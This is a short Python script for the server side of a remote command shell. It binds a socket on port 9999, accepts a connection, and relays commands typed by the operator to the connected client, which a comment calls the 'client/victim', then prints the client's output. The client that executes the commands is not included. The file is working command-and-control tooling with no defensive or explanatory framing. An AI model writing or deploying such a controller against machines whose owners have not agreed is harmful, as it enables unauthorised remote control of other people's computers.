import socket
import sys


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global hostIP
        global port
        global s_socket
        hostIP = ""  # Since host is itself a server that's why this is empty
        port = 9999
        s_socket = socket.socket()
    except socket.error as msg:
        print("Socket creation error {}".format(msg))


# Binding the socket and listening for connection
def bind_socket():
    try:
        global hostIP
        global port
        global s_socket
        print("Binding the port {}".format(port))
        s_socket.bind((hostIP, port))
        s_socket.listen(5)  # No. of connections can be listened by this server
    except socket.error as msg:
        print("Socket creation error {}".format(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (Socket must be listening)
def socket_accept():
    global s_socket
    conn, address = s_socket.accept()
    print("Connection has been established IP is {} and port is {}".format(address[0], str(address[1])))
    send_commands(conn)
    conn.close()


# send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            global s_socket
            conn.close()
            s_socket.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")  # Encoding type utf-8
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()

if __name__ == '__main__':main()